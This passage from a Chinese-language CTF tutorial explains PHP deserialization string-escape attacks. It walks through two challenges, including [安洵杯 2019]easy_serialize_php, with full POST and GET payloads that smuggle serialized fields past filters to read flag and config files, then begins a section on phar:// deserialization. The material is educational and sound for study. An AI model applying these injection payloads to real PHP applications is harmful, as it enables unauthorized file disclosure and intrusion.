class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登陆成功之后，进入 profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$profile = unserialize($profile);</code> 将填写的信息进行反序列化输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到 flag 存在于 config.php 文件当中，我们想办法读取到 config.php</p><blockquote><p><strong>思路：</strong>在 profile.php 中存在 <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> ；而 <code>$profile</code> 是一个数组，里面是我们输入的信息。如果我们控制 <code>$profile[&#39;photo&#39;]</code> 为 <code>config.php</code> 那么 之后的 <code>&lt;?php echo $phone;?&gt;</code> 将会显示出 base64 编码后的 config.php 文件内容，我们就会获取到 flag。</p></blockquote><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=aaa&amp;o=config.php</span><br><span class="line">输出：a:<span class="number">4</span>:a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>更改 nickname 的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&amp;o=config.php</span></span><br><span class="line"><span class="string">输出：a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:10:&quot;</span><span class="number">123</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:34:&quot;</span><span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>字符增加替换 ，考虑到 update.php 以及 class.php 中的过滤，我们传入 数组 nickname[]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><p><img src="https://i.loli.net/2021/06/13/Wd1MD8Af4JGy2pe.png" alt="image-20210613183651536"></p><p><img src="https://i.loli.net/2021/06/13/Na6dklr1qA8v2Yo.png" alt="image-20210613183539171"></p><p>解码得 flag</p><p><img src="https://i.loli.net/2021/06/13/zjiFCvMSHx7PDdO.png" alt="image-20210613183613090"></p><h2 id="2-5-字符减少-—-安洵杯-2019-easy-serialize-php"><a href="#2-5-字符减少-—-安洵杯-2019-easy-serialize-php" class="headerlink" title="2.5 字符减少 — [安洵杯 2019]easy_serialize_php"></a>2.5 字符减少 — [安洵杯 2019]easy_serialize_php</h2><p><a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php">题目链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><ol><li>根据提示：?f=phpinfo</li></ol></blockquote><p>发现</p><p><img src="https://i.loli.net/2021/06/13/ZhFTAEVcpUiew78.png" alt="image-20210613154055563"></p><blockquote><ol start="2"><li>auto_append_file 在任何页面输出前首先包含 d0g3_f1ag.php文件，猜测 flag存在于 该文件当中。那我们需要想办法读取到该文件；</li><li>当 <code>$function == &#39;show_image&#39;</code> 时，首先对 <code>$serialize_info</code> 进行反序列化，然后对其中 <code>$userinfo[&#39;img&#39;]</code> 进行base64解码之后，使用 <code>file_get_contents</code> 读取出文件；而 <code>$serialize_info</code> 正是我们所传入的 <code>$function</code> 在 进行 <code>filter()</code> 函数过滤之后的结果；</li></ol></blockquote><p>手动添加以下代码，输出查看序列化之后的内容：</p><p><img src="https://i.loli.net/2021/06/13/cjrJVkIPAGnb1To.png" alt="image-20210613164010874"></p><p>该 base64 编码 <code>Z3Vlc3RfaW1nLnBuZw==</code> 即是 <code>guest_img.png</code></p><blockquote><ol start="4"><li>我们需要使 <code>键 img </code> 为 <code>d0g3_f1ag.php</code> 文件加密之后的内容；<code>ZDBnM19mMWFnLnBocA==</code> 是 <code>d0g3_f1ag.php</code></li></ol></blockquote><p>构造 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post 传参：</span><br><span class="line">   </span><br><span class="line">_SESSION[user]=a&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">p</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 </span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">128</span>) <span class="string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span> </span><br></pre></td></tr></table></figure><p>以上内容如果进行反序列化，将会报错，原因：</p><blockquote><ol start="5"><li>前面 <code>a:3:</code> 表示 SESSION 含有三个键值对，它会一直向后取直到取到三个为止；第一个 user 正常取值；第二个 function 由于长度是 42 ，将会取到的值是 <code>p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> ；所以仍旧会取到第三个 img 值为 <code>Z3Vlc3RfaW1nLnBuZw==</code> ；但是进行反序列化之后，我们希望得到的是第三个 img 被挤掉，以我们在 function 中传递的 img 作为新的 img ；所以实际上如果 <code>s:42:&quot;p&quot;</code> 是 <code>s:1:&quot;p&quot;</code> 就好了。 </li><li>利用过滤函数使字符减少来增大长度，吞掉后面部分内容。</li></ol></blockquote><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 string(127) &quot;a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;&quot;;s:8:&quot;function&quot;;s:42:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure><blockquote><ol start="7"><li><code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code> 长度是 24，构造 user 值是 6个 flag ，即长度是 24，将会把 <code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code>吞掉，当作 user 的值；而 img 即为我们的 <code>d0g3_f1ag.php</code>；再手动补充一个键值对（随意）满足 _SESSION 的三个键；而位于最后的默认的 <code>guest_img.png</code> 将被挤掉，不会起作用；</li></ol><p> <strong>注意：</strong>由于吞掉了一个键值对，我们把 img 作为第二个键名存在了，但 SESSION 本身是有三个键值对的，如果我们不手动添加一个键值对的话，最后存在的原本的 img 也将会被解析，起不到挤掉的作用。</p></blockquote><p><strong>payload1 —  键值逃逸：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(146) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:60:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/13/dbMkafNKIsSPulh.png" alt="0"></p><blockquote><ol start="8"><li>对 <code>/d0g3_fllllllag</code> 进行 base64编码为 <code>L2QwZzNfZmxsbGxsbGFn</code>，长度是 20；</li></ol><p> 构造以下内容：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/13/LroXScDCuzgTatf.png" alt="image-20210613172316408"></p><blockquote><ol start="9"><li><code>&quot;;s:49:</code> 长度是 7，构造 键名为 flagphp，将其吞掉作为一个新的键名，值是 db；第二个键名 img 即是我们所构造的；由于 <code>a:2:</code>，因此一共只会取两个键名，所以最后的 img 被挤掉了。</li></ol></blockquote><p><strong>payload2 —  键名逃逸：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(108) &quot;a:2:&#123;s:7:&quot;&quot;;s:49:&quot;;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>函数总结：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">implode()把数组元素组合为一个字符串后返回：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;World!&#x27;</span>,<span class="string">&#x27;Beautiful&#x27;</span>,<span class="string">&#x27;Day!&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> implode(<span class="string">&quot; &quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 Hello World! Beautiful Day!</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">unset</span>()销毁指定的变量    </span><br><span class="line">    </span><br><span class="line">extract() 函数从数组中将变量导入到当前的符号表</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 $a = Cat; $b = Dog; $c = Horse </span></span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line"></span><br><span class="line">第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</span><br><span class="line"></span><br><span class="line">该函数返回成功导入到符号表中的变量数目。</span><br></pre></td></tr></table></figure><h1 id="三、phar-序列化"><a href="#三、phar-序列化" class="headerlink" title="三、phar 序列化"></a>三、phar 序列化</h1><p><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p><p><a href="https://blog.csdn.net/qq975353472/article/details/109668373">https://blog.csdn.net/qq975353472/article/details/109668373</a></p><p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p><p>一般利用反序列化漏洞，一般都是借助unserialize()函数。</p><p><strong>新型攻击方式：利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</strong></p><ul><li>特点：不使用 <code>unserialize()函数</code></li></ul><p><strong>利用条件：</strong></p><ul><li>能够上传 <code>.phar</code> 文件至服务器</li><li>存在可用的 魔术方法 作为跳板</li><li>文件操作函数的参数可控</li><li><code>/  :   phar</code>  等特殊字符未被过滤</li></ul><p><strong>受影响函数列表：</strong></p><p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p><p>原理参考 <a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p><h2 id="3-1-phar-介绍"><a href="#3-1-phar-介绍" class="headerlink" title="3.1 phar 介绍"></a>3.1 phar 介绍</h2><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，会以序列化的形式存储用户自定义的 <code>meta-data</code> ，当受影响的文件操作函数调用 phar 文件时，会自动反序列化 meta-data 中的内容。</p><p>在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。用来将多个PHP文件打包为一个文件.可以和tar zip相互转化。</p><ul><li>版本 &gt;5.2</li></ul><p><strong>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。</strong>内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 <strong>phar://就是一种内置的流包装器。</strong></p><p><strong>php中一些常见的流包装器如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — 